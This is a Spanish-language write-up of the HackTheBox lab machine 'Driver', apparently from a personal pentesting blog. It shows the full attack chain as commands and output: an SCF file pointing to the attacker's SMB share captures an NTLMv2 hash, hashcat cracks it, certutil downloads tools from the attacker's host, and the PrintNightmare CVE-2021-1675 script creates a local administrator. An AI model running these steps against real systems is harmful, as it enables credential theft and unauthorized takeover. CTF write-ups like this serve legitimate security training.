---
layout: post
title: Driver - WriteUp
author: WildZarek
permalink: /htb/driver
excerpt: "Máquina Windows de nivel fácil, en la que veremos sobre Directorio Activo vulnerando el gestor de actualizaciones de firmware mediante la web y posteriormente aprovechando un CVE usando un script en PowerShell que nos permite crear un usuario con privilegios."
description: "Máquina Windows de nivel fácil, en la que veremos sobre Directorio Activo vulnerando el gestor de actualizaciones de firmware mediante la web y posteriormente aprovechando un CVE usando un script en PowerShell que nos permite crear un usuario con privilegios."
date: 2022-02-26
header:
  teaser: /assets/images/hackthebox/machines/driver.png
  teaser_home_page: true
  icon: /assets/images/hackthebox/htb_icon_original.png
categories: [HackTheBox, Pentesting, Web Exploitation, Password Guessing, Privilege Escalation]
tags: [ACTIVE-DIRECTORY, SCF, CVE, PRINT-NIGHTMARE, WEAK PASSWORD, RCE]
---

<p align="center"><img src="/assets/images/hackthebox/machines/driver.png"></p>

## Fecha de Resolución

<p align="center"><a href="https://www.hackthebox.com/achievement/machine/18979/387"><img src="/assets/images/hackthebox/machines/driver/pwned_date.png"></a></p>

## Fase de Reconocimiento

Empezamos con el reconocimiento de puertos lanzando un **`TCP SYN Port Scan`**

| Parámetro | Descripción |
| --------- | :---------- |
| -p-       | Escanea el rango completo de puertos (hasta el 65535)    |
| -sS       | Realiza un escaneo de tipo SYN port scan                 |
| --min-rate | Enviar paquetes no más lentos que 5000 por segundo      |
| --open    | Mostrar sólo los puertos que esten abiertos              |
| -vvv      | Triple verbose para ver en consola los resultados        |
| -n        | No efectuar resolución DNS                               |
| -Pn       | No efectuar descubrimiento de hosts                      |
| -oG       | Guarda el output en un archivo con formato grepeable para usar la función [extractPorts](https://pastebin.com/tYpwpauW) de [S4vitar](https://s4vitar.github.io/)

```console
p3ntest1ng:~$ nmap -p- -sS --min-rate 5000 --open -vvv -n -Pn 10.10.11.106 -oG allPorts

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-25 11:58 CET
Initiating SYN Stealth Scan at 11:58
Scanning 10.10.11.106 [65535 ports]
Discovered open port 80/tcp on 10.10.11.106
Discovered open port 135/tcp on 10.10.11.106
Discovered open port 445/tcp on 10.10.11.106
Discovered open port 5985/tcp on 10.10.11.106
Completed SYN Stealth Scan at 11:59, 26.38s elapsed (65535 total ports)
Nmap scan report for 10.10.11.106
Host is up, received user-set (0.048s latency).
Scanned at 2022-02-25 11:58:39 CET for 27s
Not shown: 65531 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE      REASON
80/tcp   open  http         syn-ack ttl 127
135/tcp  open  msrpc        syn-ack ttl 127
445/tcp  open  microsoft-ds syn-ack ttl 127
5985/tcp open  wsman        syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 26.63 seconds
           Raw packets sent: 131085 (5.768MB) | Rcvd: 35 (2.020KB)
```

Identificamos los siguientes puertos abiertos:

| Puerto | Descripción |
| :----- | :---------- |
| 80     | **[HTTP](https://es.wikipedia.org/wiki/Servidor_web)** - Servidor Web |
| 135    | **[MSRPC](https://es.wikipedia.org/wiki/Llamada_a_procedimiento_remoto)** - Microsoft RPC Services |
| 445    | **[SMB](https://es.wikipedia.org/wiki/Server_Message_Block)** - Server Message Block |
| 5985   | **[WINRM](https://docs.microsoft.com/es-es/windows/win32/winrm/portal?redirectedfrom=MSDN)** - Windows Remote Management |

Vamos a obtener más información con un escaneo específico sobre los puertos que hemos encontrado.

| Parámetro | Descripción |
| :-------- | :---------- |
| -p        | Escanea sobre los puertos especificados                |
| -sC       | Muestra todos los scripts relacionados con el servicio |
| -sV       | Determina la versión del servicio                      |
| -oN       | Guarda el output en un archivo con formato normal      |

```console
p3ntest1ng:~$ nmap -sCV -p 80,135,445,5985 10.10.11.106 -oN targeted

Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-25 12:15 CET
Nmap scan report for driver.htb (10.10.11.106)
Host is up (0.11s latency).

PORT     STATE SERVICE      VERSION
80/tcp   open  http         Microsoft IIS httpd 10.0
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=MFP Firmware Update Center. Please enter password for admin
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
135/tcp  open  msrpc        Microsoft Windows RPC
445/tcp  open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: DRIVER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2022-02-25T18:33:20
|_  start_date: 2022-02-25T17:53:30
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
|_clock-skew: mean: 7h17m54s, deviation: 0s, median: 7h17m54s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 50.09 seconds
```
Echemos un vistazo con **`whatweb`** para ver cómo está construida la página web.

```console
p3ntest1ng:~$ whatweb http://10.10.11.106/
http://10.10.11.106/ [401 Unauthorized] Country[RESERVED][ZZ], HTTPServer[Microsoft-IIS/10.0], IP[10.10.11.106], Microsoft-IIS[10.0], PHP[7.3.25], WWW-Authenticate[MFP Firmware Update Center. Please enter password for admin][Basic], X-Powered-By[PHP/7.3.25]
```

Normalmente buscaríamos directorios y subdominios pero en este caso no aplica ya que yo realicé el fuzzing y no encontré nada interesante.
Veamos directamente lo que tenemos en la página web, pero antes vamos a añadir un virtualhost a nuestro archivo **`/etc/hosts`**.

```console
p3ntest1ng:~$ echo '10.10.11.106 driver.htb' | sudo tee -a /etc/hosts
```

![Login](/assets/images/hackthebox/machines/driver/login.png)

## Fase de Explotación

Lo primero que nos encontramos es un login pidiéndonos credenciales de acceso al sitio, en este caso pruebo **`admin:admin`** y...¡Funciona!.

![Website](/assets/images/hackthebox/machines/driver/website.png)

En esta página sólo funciona el menú **`Firmware Updates`**:

![Updates](/assets/images/hackthebox/machines/driver/updates.png)

Aquí vemos que podemos subir un nuevo firmware para la impresora.
Sabemos que el servidor tiene SMB habilitado, por lo que podemos crear un archivo 
[SCF](https://www.bleepingcomputer.com/news/security/you-can-steal-windows-login-credentials-via-google-chrome-and-scf-files/)
(Shell Command File) para capturar hashes [NTLMv2](https://ldapwiki.com/wiki/NTLMv2)

```console
p3ntest1ng:~$ vi @gethash.scf
[shell]
Command=2
IconFile=\\10.10.16.25\share\test.ico
[Taskbar]
Command=ToggleDesktop
```

#### ¿Por qué ponemos el @ delante del nombre del archivo?

Añadiendo este símbolo al comienzo del nombre, el archivo será colocado por encima del resto en el recurso compartido.

Una vez creado el archivo, compartimos un recurso en red con ayuda de  **`impacket-smbserver`** y subimos el archivo **`.scf`** a la web.

```console
p3ntest1ng:~$ sudo impacket-smbserver -debug -smb2support share $(pwd)
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket
[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.10.11.106,49525)
[*] AUTHENTICATE_MESSAGE (DRIVER\tony,DRIVER)
[*] User DRIVER\tony authenticated successfully
[*] tony::DRIVER:aaaaaaaaaaaaaaaa:9991db804510f48964a41ea7deb9f4e9:0101000000000000002605df4b2ad801e44969567acd523200000000010010004800700049006f006700490055006600030010004800700049006f0067004900550066000200100075006c00500070004f004a00730041000400100075006c00500070004f004a007300410007000800002605df4b2ad80106000400020000000800300030000000000000000000000000200000539a457fb58fa01a9211ce1bc906e7ae99c28bdb93afbca3f53a76a6ca6e05a50a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310036002e0032003500000000000000000000000000
[*] Connecting Share(1:IPC$)
[*] Connecting Share(2:share)
[*] Disconnecting Share(1:IPC$)
[*] Disconnecting Share(2:share)
[*] Closing down connection (10.10.11.106,49525)
[*] Remaining connections []
^C
```

Hemos obtenido el hash del usuario **`tony`**, lo guardamos a un archivo y verificamos que el formato del hash sea el correcto:

```console
p3ntest1ng:~$ hashid tony.hash
--File 'tony.hash'--
Analyzing 'tony::DRIVER:aaaaaaaaaaaaaaaa:9991db804510f48964a41ea7deb9f4e9:0101000000000000002605df4b2ad801e44969567acd523200000000010010004800700049006f006700490055006600030010004800700049006f0067004900550066000200100075006c00500070004f004a00730041000400100075006c00500070004f004a007300410007000800002605df4b2ad80106000400020000000800300030000000000000000000000000200000539a457fb58fa01a9211ce1bc906e7ae99c28bdb93afbca3f53a76a6ca6e05a50a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310036002e0032003500000000000000000000000000'
[+] NetNTLMv2
```

Perfecto, nos lo reconoce como NetNTLMv2, ahora tratemos de romperlo con ayuda de la herramienta **`hashcat`**.

```console
p3ntest1ng:~$ hashcat --help | grep NetNTLMv2
   5600 | NetNTLMv2                  | Network Protocols
p3ntest1ng:~$ hashcat -a 0 -m 5600 tony.hash /usr/share/wordlists/rockyou.txt
hashcat (v6.1.1) starting...

...[snip]...

Host memory required for this attack: 64 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

TONY::DRIVER:aaaaaaaaaaaaaaaa:9991db804510f48964a41ea7deb9f4e9:0101000000000000002605df4b2ad801e44969567acd523200000000010010004800700049006f006700490055006600030010004800700049006f0067004900550066000200100075006c00500070004f004a00730041000400100075006c00500070004f004a007300410007000800002605df4b2ad80106000400020000000800300030000000000000000000000000200000539a457fb58fa01a9211ce1bc906e7ae99c28bdb93afbca3f53a76a6ca6e05a50a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310036002e0032003500000000000000000000000000:liltony
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: NetNTLMv2
Hash.Target......: TONY::DRIVER:aaaaaaaaaaaaaaaa:9991db804510f48964a41...000000
Time.Started.....: Fri Feb 25 14:46:50 2022 (0 secs)
Time.Estimated...: Fri Feb 25 14:46:50 2022 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   230.1 kH/s (5.72ms) @ Accel:1024 Loops:1 Thr:1 Vec:4
Recovered........: 1/1 (100.00%) Digests
Progress.........: 32768/14344385 (0.23%)
Rejected.........: 0/32768 (0.00%)
Restore.Point....: 30720/14344385 (0.21%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: !!!!!! -> eatme1

Started: Fri Feb 25 14:46:47 2022
Stopped: Fri Feb 25 14:46:52 2022
```

En pocos segundos nos devuelve la contraseña, ya podemos usar estas credenciales contra el SMB. Veamos los recursos compartidos.

```console
p3ntest1ng:~$ smbmap -H 10.10.11.106 -u tony -p 'liltony'
[+] IP: 10.10.11.106:445	Name: driver.htb                                        
    Disk                           Permissions	Comment
	----                           -----------	-------
	ADMIN$                         NO ACCESS	Remote Admin
	C$                             NO ACCESS	Default share
	IPC$                           READ ONLY	Remote IPC
```

Anteriormente vimos el puerto **`5985`** abierto, que corresponde al servicio **`WinRM`**.
Como tenemos credenciales, podemos conectarnos y tratar de leer el archivo **`user.txt`**
(en máquinas Windows de HTB suele estar en el Escritorio).

```console
p3ntest1ng:~$ evil-winrm -i 10.10.11.106 -u tony -p 'liltony'

Evil-WinRM shell v3.3

...[snip]...

*Evil-WinRM* PS C:\Users\tony\Documents> type ..\Desktop\user.txt
79a84569416277bb85a8797661e17a43
```

## Escalada de Privilegios

Antes de nada necesitamos enumerar para ver qué servicios existen en el sistema.
Para ello usaremos **`winPEAS`** que podemos descargar de su repositorio en Github.

> https://github.com/carlospolop/PEASS-ng

Nos bajamos el binario en nuestra máquina:

```console
p3ntest1ng:~$ wget https://github.com/carlospolop/PEASS-ng/releases/download/20220220/winPEASx64.exe

...[snip]...

winPEASx64.exe    100%[================================>]   1,84M  --.-KB/s    en 0,1s    

2022-02-25 16:17:05 (13,3 MB/s) - «winPEASx64.exe» guardado [1931776/1931776]
```

Compartimos un servicio http con python y lo descargamos desde la víctima:

```console
p3ntest1ng:~$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

```console
*Evil-WinRM* PS C:\Users\tony\Documents> cd C:\Windows\Temp
*Evil-WinRM* PS C:\Windows\Temp> mkdir Privesc


    Directory: C:\Windows\Temp


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        2/25/2022   4:27 PM                Privesc


*Evil-WinRM* PS C:\Windows\Temp> cd Privesc
```

Ahora con la ayuda de **`certutil.exe`** podemos descargarnos desde la máquina Driver el binario de WinPEAS
que estamos compartiendo en nuestra máquina gracias al servidor http que hemos levantado con Python.

```console
*Evil-WinRM* PS C:\Windows\Temp\Privesc> certutil.exe -f -urlcache -split http://10.10.16.25/winPEASx64.exe winpeas.exe
****  Online  ****
  000000  ...
  1d7a00
CertUtil: -URLCache command completed successfully.
*Evil-WinRM* PS C:\Windows\Temp\Privesc> dir


    Directory: C:\Windows\Temp\Privesc


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        2/25/2022   4:34 PM        1931776 winpeas.exe
```

Para que el output nos lo muestre con colores, tenemos que modificar una clave del registro de la siguiente forma:

```console
*Evil-WinRM* PS C:\Windows\Temp\Privesc> REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1
The operation completed successfully.
```

Ahora ya podemos ejecutar el binario, pero debemos tener en cuenta que hay que pasarle la ruta absoluta:

```console
*Evil-WinRM* PS C:\Windows\Temp\Privesc> C:\Windows\Temp\Privesc\winpeas.exe
```

![Services](/assets/images/hackthebox/machines/driver/services.png)

De entre toda la información que obtenemos, vemos varias cosas interesantes pero nos vamos a centrar en el servicio **`spoolsv`**
que se encarga de gestionar la cola de impresión y de manejar la interacción con la impresora.
Buscando en Google sobre este servicio, encontramos rápidamente información de una vulnerabilidad conocida como [Print Nightmare](https://cybersync.org/blogs-en/exploitation_of_the_print_nightmare_vulnerability)

En la página referenciada hablan de dos vulnerabilidades similares, nosotros nos centraremos en el [CVE-2021-1675](https://www.incibe-cert.es/alerta-temprana/vulnerabilidades/cve-2021-1675)

Vemos que incluso es posible provocar un [Remote Code Execution (RCE)](https://beaglesecurity.com/blog/vulnerability/remote-code-execution.html) como usuario privilegiado.

Una vez más, realizando una búsqueda rápida en Google encontramos un repositorio en Github con un script escrito en PowerShell.
Este script nos permite la creación de un nuevo usuario con privilegios en el sistema. Vamos a clonarlo a nuestra máquina.

```console
p3ntest1ng:~$ git clone https://github.com/calebstewart/CVE-2021-1675
Clonando en 'CVE-2021-1675'...
remote: Enumerating objects: 40, done.
remote: Counting objects: 100% (40/40), done.
remote: Compressing objects: 100% (32/32), done.
remote: Total 40 (delta 9), reused 37 (delta 6), pack-reused 0
Recibiendo objetos: 100% (40/40), 131.12 KiB | 1024.00 KiB/s, listo.
Resolviendo deltas: 100% (9/9), listo.
Actualizando archivos: 100% (10/10), listo.
p3ntest1ng:~$ ls -la
drwxr-xr-x any0ne any0ne  44 B  Fri Feb 25 19:10:47 2022  nightmare-dll
.rw-r--r-- any0ne any0ne 174 KB Fri Feb 25 19:10:47 2022  CVE-2021-1675.ps1
.rw-r--r-- any0ne any0ne 2.2 KB Fri Feb 25 19:10:47 2022  README.md
```

Nos compartimos el recurso levantando un servidor http con Python como hicimos anteriormente y nos lo descargamos en la máquina Driver.

```console
*Evil-WinRM* PS C:\Windows\Temp\Privesc> certutil.exe -f -urlcache -split http://10.10.16.25/CVE-2021-1675.ps1 pn.ps1
****  Online  ****
  000000  ...
  02b981
CertUtil: -URLCache command completed successfully.
```

Recibimos las peticiones GET de nuestro lado:

```console
p3ntest1ng:~$ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.106 - - [25/Feb/2022 19:29:22] "GET /CVE-2021-1675.ps1 HTTP/1.1" 200 -
10.10.11.106 - - [25/Feb/2022 19:29:23] "GET /CVE-2021-1675.ps1 HTTP/1.1" 200 -
```

Con esto listo, podemos probar a importar este script como módulo de PowerShell en la máquina Driver.

```console
*Evil-WinRM* PS C:\Windows\Temp\Privesc> Import-Module ./pn.ps1
```

Si en este punto nos da error de importación, se debe a que no tenemos permisos suficientes para ejecución:

```console
*Evil-WinRM* PS C:\Windows\Temp\Privesc> File C:\Windows\Temp\Privesc\pn.ps1 cannot be loaded because running scripts is disabled on this system. For more information, see about_Execution_Policies at http://go.microsoft.com/fwlink/?LinkID=135170.
At line:1 char:1
+ Import-Module ./pn.ps1
+ ~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : SecurityError: (:) [Import-Module], PSSecurityException
    + FullyQualifiedErrorId : UnauthorizedAccess,Microsoft.PowerShell.Commands.ImportModuleCommand
```

Podemos comprobar los permisos de ejecución de este modo:

```console
*Evil-WinRM* PS C:\Windows\Temp\Privesc> Get-ExecutionPolicy                          
Restricted
*Evil-WinRM* PS C:\Windows\Temp\Privesc> Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted -Force;
*Evil-WinRM* PS C:\Windows\Temp\Privesc> Get-ExecutionPolicy                          
Unrestricted
```

Como vimos anteriormente, con ayuda de este script podemos crear un nuevo usuario con privilegios de administrador.

```console
*Evil-WinRM* PS C:\Windows\Temp\Privesc> Import-Module ./pn.ps1
*Evil-WinRM* PS C:\Windows\Temp\Privesc> Invoke-Nightmare -NewUser "wildzarek" -NewPassword "wildzarek"
[+] created payload at C:\Users\tony\AppData\Local\Temp\nightmare.dll
[+] using pDriverPath = "C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_f66d9eed7e835e97\Amd64\mxdwdrv.dll"
[+] added user wildzarek as local administrator
[+] deleting payload from C:\Users\tony\AppData\Local\Temp\nightmare.dll
```

Finalmente, nos logueamos con este nuevo usuario utilizando **`evil-winrm`**

```console
p3ntest1ng:~$ evil-winrm -i 10.10.11.106 -u wildzarek -p 'wildzarek'

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\wildzarek\Documents> cd C:\Users\Administrator\Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        2/25/2022   5:58 PM             34 root.txt


*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
15a8eafbe4143d5ea98467f22c7c8eb3
```

Enhorabuena pentesters, otra máquina más para la colección :)

### ¡Gracias por leer hasta el final!

Una máquina facilita que en mi caso me sirvió como introducción a entornos Active Directory en sistemas Windows, ya que nunca antes había tocado dicho entorno.
Recomendable si no has tocado muchas máquinas Windows y quieres empezar a aprender sobre AD.

#### Nos vemos en un próximo. ¡Feliz hacking! ☠